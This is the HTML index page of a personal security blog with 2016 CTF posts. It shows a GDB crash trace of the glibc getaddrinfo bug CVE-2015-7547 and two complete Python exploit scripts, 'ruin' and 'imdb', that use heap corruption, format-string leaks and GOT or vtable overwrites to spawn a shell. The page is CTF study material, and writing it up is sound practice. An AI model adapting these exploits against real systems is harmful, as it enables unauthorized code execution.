<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Bigtang&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Bigtang's Blog">
<meta property="og:url" content="http://bigtang.org/index.html">
<meta property="og:site_name" content="Bigtang's Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bigtang's Blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="Bigtang&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">b1gtang</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="#" title="rss">rss</a>
					        
								<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Arm/" style="font-size: 10px;">Arm</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://l-team.org/">L</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https:leavesongs.com/">Phithon</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://le4f.net/">le4f</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://z1ng.net/">z1ng</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://x0day.me/">DM_</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://wils0n.cn/">wilson</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://th1nk.info/">Th1nk</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me">Chu</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://cyrils.org">Cyrils</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.iret.xyz/">Silver</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://joychou.org/">Joychou</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">Binary analysis, computer security, exploit writing, CTFs, hacking</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">b1gtang</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">b1gtang</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="#" title="rss">rss</a>
			        
						<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-cve-2015-7547" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/29/cve-2015-7547/" class="article-date">
  	<time datetime="2016-03-29T13:03:18.000Z" itemprop="datePublished">2016-03-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/29/cve-2015-7547/">cve-2015-7547</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>=&gt; 0x8048573 <main+72>:    call   0x8048420 <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#103;&#x65;&#x74;&#x61;&#100;&#x64;&#114;&#105;&#110;&#x66;&#111;&#x40;&#112;&#108;&#x74;">&#103;&#x65;&#x74;&#x61;&#100;&#x64;&#114;&#105;&#110;&#x66;&#111;&#x40;&#112;&#108;&#x74;</a><br>=&gt; 0xb7ed9c40 <__gi_getaddrinfo>:    push   ebp<br>Breakpoint 1, __GI_getaddrinfo (name=0x8048643 “bigtang.org”,<br>    service=0x8048640 “22”, hints=0xbffff04c, pai=0xbffff044)<br>    at ../sysdeps/posix/getaddrinfo.c:2323</__gi_getaddrinfo></main+72></p>
<p>=&gt; 0xb7ed9d23 <__gi_getaddrinfo+227>:    call   0xb7ed7470 <gaih_inet><br>=&gt; 0xb7ed7470 <gaih_inet>:    push   ebp<br>Breakpoint 2, gaih_inet (name=0x8048643 “bigtang.org”, service=0xbfffef80,<br>    req=0xbffff04c, pai=0xbfffef70, naddrs=0xbfffef7c)<br>    at ../sysdeps/posix/getaddrinfo.c:275</gaih_inet></gaih_inet></__gi_getaddrinfo+227></p>
<p>=&gt; 0xb7ed80c7 <gaih_inet+3159>:    call   edi<br>=&gt; 0xb7def4d0 <_nss_dns_gethostbyname4_r>:    push   ebp<br>_nss_dns_gethostbyname4_r (name=0x8048643 “bigtang.org”, pat=0xbfffeecc,<br>    buffer=0xbfffe9e0 “\377\002”, buflen=0x420, errnop=0xbfffeed0,<br>    herrnop=0xbfffeedc, ttlp=0x0) at nss_dns/dns-host.c:284</_nss_dns_gethostbyname4_r></gaih_inet+3159></p>
<p>=&gt; 0xb7def58b <_nss_dns_gethostbyname4_r+187>:    call   0xb7dedb70 <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x5f;&#x5f;&#108;&#105;&#98;&#x63;&#95;&#x72;&#101;&#115;&#x5f;&#x6e;&#x73;&#x65;&#97;&#114;&#99;&#104;&#x40;&#x70;&#x6c;&#x74;">&#x5f;&#x5f;&#108;&#105;&#98;&#x63;&#95;&#x72;&#101;&#115;&#x5f;&#x6e;&#x73;&#x65;&#97;&#114;&#99;&#104;&#x40;&#x70;&#x6c;&#x74;</a><br>=&gt; 0xb7ddb240 <__gi___libc_res_nsearch>:    push   ebp<br><strong>GI_</strong>libc_res_nsearch (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:342</_res></__gi___libc_res_nsearch></_nss_dns_gethostbyname4_r+187></p>
<p>=&gt; 0xb7ddb4c6 <__gi___libc_res_nsearch+646>:<br>    call   0xb7ddaeb0 <__libc_res_nquerydomain><br>=&gt; 0xb7ddaeb0 <__libc_res_nquerydomain>:    push   ebp<br>__libc_res_nquerydomain (statp=statp@entry=0xb7fc1340 <_res>,<br>    name=name@entry=0x8048643 “bigtang.org”, domain=0x0, class=0x1,<br>    type=0xf371, answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”,<br>    anslen=0x800, answerp=0xbfffe97c, answerp2=0xbfffe980,<br>    nanswerp2=0xbfffe984, resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c)<br>    at res_query.c:563</_res></__libc_res_nquerydomain></__libc_res_nquerydomain></__gi___libc_res_nsearch+646></p>
<p>=&gt; 0xb7ddaf9c <__libc_res_nquerydomain+236>:<br>    call   0xb7dda7f0 <__gi___libc_res_nquery><br>=&gt; 0xb7dda7f0 <__gi___libc_res_nquery>:    push   ebp<br><strong>GI_</strong>libc_res_nquery (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:124<br>124    in res_query.c</_res></__gi___libc_res_nquery></__gi___libc_res_nquery></__libc_res_nquerydomain+236></p>
<p>=&gt; 0xb7dda969 <__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3]<br>EAX: 0xbfffe980 (‘B’ <repeats 200="" times="">…)<br>EBX: 0xb7dea000 –&gt; 0x14ed4<br>ECX: 0xbfffe980 (‘B’ <repeats 200="" times="">…)<br>EDX: 0x42424242 (‘BBBB’)<br>ESI: 0xb7fc1340 –&gt; 0x5<br>EDI: 0x42424242 (‘BBBB’)<br>EBP: 0xbfffd7f8 –&gt; 0x0<br>ESP: 0xbfffd550 –&gt; 0x16b04<br>EIP: 0xb7dda969 (<__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3])</__gi___libc_res_nquery+377></repeats></repeats></__gi___libc_res_nquery+377></p>
<p>EAX: 0xbfffe980 (“fA;5A;”…)<br>EBX: 0xb7dea000 –&gt; 0x14ed4<br>ECX: 0xbfffe980 (“fA;5A;”…)<br>EDX: 0x353b4166 (‘fA;5’)<br>ESI: 0xb7fc1340 –&gt; 0x5<br>EDI: 0x3b414a3b (‘;JA;’)<br>EBP: 0xbfffd7f8 –&gt; 0x0<br>ESP: 0xbfffd550 –&gt; 0x11035<br>EIP: 0xb7dda969 (<__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3])</__gi___libc_res_nquery+377></p>
<p>0x353b4166  2090 0x3b414a3b  2094</p>
<p>EAX: 0x0<br>EBX: 0x42424242 (‘BBBB’)<br>ECX: 0xb7fbe858 –&gt; 0x804b000 –&gt; 0x0<br>EDX: 0x0<br>ESI: 0x42424242 (‘BBBB’)<br>EDI: 0x42424242 (‘BBBB’)<br>EBP: 0x42424242 (‘BBBB’)<br>ESP: 0xbfffe9c0 –&gt; 0x8044242<br>EIP: 0x42424242 (‘BBBB’)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[————————————-code————————————-]<br>Invalid $PC address: 0x42424242<br>[————————————stack————————————-]<br>0000| 0xbfffe9c0 –&gt; 0x8044242<br>0004| 0xbfffe9c4 –&gt; 0xbfffeecc –&gt; 0xbfffee10 –&gt; 0x0<br>0008| 0xbfffe9c8 –&gt; 0xbfffe9e0 –&gt; 0x2ff<br>0012| 0xbfffe9cc –&gt; 0x420<br>0016| 0xbfffe9d0 –&gt; 0xbfffeed0 –&gt; 0xb (‘\x0b’)<br>0020| 0xbfffe9d4 –&gt; 0xbfffeedc –&gt; 0x2<br>0024| 0xbfffe9d8 –&gt; 0x0<br>0028| 0xbfffe9dc –&gt; 0x0<br>[——————————————————————————]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x42424242 in ?? ()</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-BCTF-2016-ruin" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/23/BCTF-2016-ruin/" class="article-date">
  	<time datetime="2016-03-23T06:05:15.000Z" itemprop="datePublished">2016-03-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/23/BCTF-2016-ruin/">BCTF-2016-ruin</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download:<a href="http://bigtang.org/files/ruin.7b694dc96bf316a40ff7163479850f78">ruin.7b694dc96bf316a40ff7163479850f78</a> <a href="http://bigtang.org/files/ruin.idb">ruin.idb</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = zio((<span class="string">"127.0.0.1"</span>,<span class="number">2333</span>),print_read=RAW,print_write=RAW)</span><br><span class="line"><span class="comment">#io = zio(("166.111.132.49",9999))</span></span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x8594</span></span><br><span class="line">printf_got = <span class="number">0x00010F58</span></span><br><span class="line">printf_off = <span class="number">0x385c0</span></span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x10f80</span></span><br><span class="line">system_off   = <span class="number">0x2e7c8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkKey</span><span class="params">(key)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"please input your 8-bit key:"</span>)</span><br><span class="line">	io.write(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updateKey</span><span class="params">(key)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"1"</span>)</span><br><span class="line">	io.read_until(<span class="string">"enter the new 16-bit key:"</span>)</span><br><span class="line">	io.write(key)</span><br><span class="line">           </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editSecret</span><span class="params">(secret)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"2"</span>)</span><br><span class="line">	io.read_until(<span class="string">"please input your secret:"</span>)</span><br><span class="line">	io.writeline(secret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signName</span><span class="params">(name)</span>:</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"3"</span>)</span><br><span class="line">	io.read_until(<span class="string">"please input your name length:"</span>)</span><br><span class="line">	io.writeline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakHeap</span><span class="params">()</span>:</span></span><br><span class="line">	checkKey(<span class="string">"bigtang!"</span>)</span><br><span class="line">	io.read_until(<span class="string">"bigtang!"</span>)</span><br><span class="line">	addr = io.read_until(<span class="string">' is'</span>)[:<span class="number">-3</span>]</span><br><span class="line">	addr = addr.ljust(<span class="number">4</span>,<span class="string">'\x00'</span>)</span><br><span class="line">	heap = l32(addr)<span class="number">-0x8</span></span><br><span class="line">	<span class="keyword">if</span> heap:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\n[+] Got Heap base: %x"</span> % heap</span><br><span class="line">		<span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakLibc</span><span class="params">(heap)</span>:</span></span><br><span class="line">	checkKey(<span class="string">"security"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># house of force</span></span><br><span class="line">	editSecret(l32(<span class="number">0xffffffff</span>).rjust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">	signName(str(<span class="number">0x10fa0</span>-(heap+<span class="number">0x10</span>)))</span><br><span class="line">	updateKey((l32(atoi_got)+l32(<span class="number">0</span>)+l32(atoi_got)).rjust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	updateKey(l32(printf_plt).ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	<span class="comment">#raw_input()</span></span><br><span class="line">	io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">	io.writeline(<span class="string">"%6$s"</span>+l32(printf_got))</span><br><span class="line">	libc = l32(io.read(<span class="number">4</span>)) - printf_off - <span class="number">1</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\n[+] Got Libc base: %x"</span> % libc</span><br><span class="line">	<span class="keyword">return</span> libc</span><br><span class="line"></span><br><span class="line">heap = leakHeap()</span><br><span class="line">libc = leakLibc(heap)</span><br><span class="line">system = libc + system_off</span><br><span class="line"><span class="comment">#editSecret(l32(libc+0x2e36c))</span></span><br><span class="line">editSecret(l32(system))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">io.read_until(<span class="string">"Give me your choice(1-4):"</span>)</span><br><span class="line">io.writeline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#raw_input("[*] De<span class="doctag">bug:</span>")</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Qiangwang-Cup-2015-imdb" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/21/Qiangwang-Cup-2015-imdb/" class="article-date">
  	<time datetime="2016-03-21T10:22:37.000Z" itemprop="datePublished">2016-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/21/Qiangwang-Cup-2015-imdb/">Qiangwang-Cup-2015-imdb</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/imdb.e31f5ffcdb6571a4e672382187bc6345">imdb.e31f5ffcdb6571a4e672382187bc6345</a><br><a href="http://bigtang.org/files/imdb.idb">imdb.idb</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.33.10"</span></span><br><span class="line">port = <span class="number">2333</span></span><br><span class="line">io = zio((host,port),print_read=NONE,print_write=NONE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a TV</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addTV</span><span class="params">(name,season,rating,introduction)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writelines([<span class="string">"1"</span>,name,season,rating,introduction])</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a Movie</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addMovie</span><span class="params">(name,actors,rating,introduction)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writelines([<span class="string">"2"</span>,name,actors,rating,introduction])</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove an entry</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">removeEntry</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writelines([<span class="string">"3"</span>,name])</span><br><span class="line"></span><br><span class="line"><span class="comment"># show all TV/Movie</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showAll</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#raw_input("DE<span class="doctag">BUG:</span>")</span></span><br><span class="line">    io.read_until(<span class="string">"Your choice? "</span>)</span><br><span class="line">    io.writeline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read any address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddr</span><span class="params">(address)</span>:</span></span><br><span class="line">    addTV(<span class="string">"a"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    removeEntry(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    removeEntry(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    fakeMovie  = <span class="string">""</span></span><br><span class="line">    fakeMovie += l64(<span class="number">0x4015b0</span>)</span><br><span class="line">    fakeMovie += (<span class="string">"b"</span>*<span class="number">16</span>).ljust(<span class="number">64</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fakeMovie += (<span class="string">"f"</span>*<span class="number">0x80</span>)</span><br><span class="line">    fakeMovie += l64(<span class="number">0x42c80000</span>)</span><br><span class="line">    fakeMovie += l64(address)</span><br><span class="line">    <span class="keyword">assert</span> len(fakeMovie) == <span class="number">0xd8</span></span><br><span class="line">    addMovie(<span class="string">"a"</span>*<span class="number">0x10</span>,fakeMovie,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    showAll()</span><br><span class="line">    io.read_until(<span class="string">"actors: "</span>)</span><br><span class="line">    io.read_until(<span class="string">"actors: "</span>)</span><br><span class="line">    leak = l64(io.readline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="comment">#print "[*] Got [0x%x] 0x%x " % (address,leak)</span></span><br><span class="line">    removeEntry(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    removeEntry(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="comment"># call any address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callAddr</span><span class="params">(vtable,address)</span>:</span></span><br><span class="line">    addTV(<span class="string">"a"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    addTV(<span class="string">"b"</span>*<span class="number">0x10</span>,<span class="string">"0"</span>,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    removeEntry(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    removeEntry(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    fakeMovie  = <span class="string">""</span></span><br><span class="line">    fakeMovie += l64(vtable)</span><br><span class="line">    fakeMovie += (<span class="string">"b"</span>*<span class="number">16</span>).ljust(<span class="number">64</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fakeMovie += (<span class="string">"f"</span>*<span class="number">0x80</span>)</span><br><span class="line">    fakeMovie += l64(<span class="number">0x42c80000</span>)</span><br><span class="line">    fakeMovie += l64(address)</span><br><span class="line">    <span class="keyword">assert</span> len(fakeMovie) == <span class="number">0xd8</span></span><br><span class="line">    addMovie(<span class="string">"a"</span>*<span class="number">0x10</span>,fakeMovie,<span class="string">"100"</span>,<span class="string">"f"</span>*<span class="number">0x7f</span>)</span><br><span class="line">    showAll()</span><br><span class="line"></span><br><span class="line">heap = readAddr(<span class="number">0x601dc0</span>) - <span class="number">0x10</span></span><br><span class="line">vtable = heap + <span class="number">0x1c0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Got heap 0x%x"</span> % heap</span><br><span class="line"></span><br><span class="line">puts = readAddr(<span class="number">0x601c40</span>)</span><br><span class="line">libc = puts - <span class="number">0x6fe30</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Got libc_base 0x%x "</span> % (libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Got spawn_Shell 0x%x"</span> % (libc + <span class="number">0x46520</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">callAddr(vtable,libc + <span class="number">0x46520</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UAF/">UAF</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-RCTF-2015-Quals-pwn500" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/21/RCTF-2015-Quals-pwn500/" class="article-date">
  	<time datetime="2016-03-21T10:13:45.000Z" itemprop="datePublished">2016-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
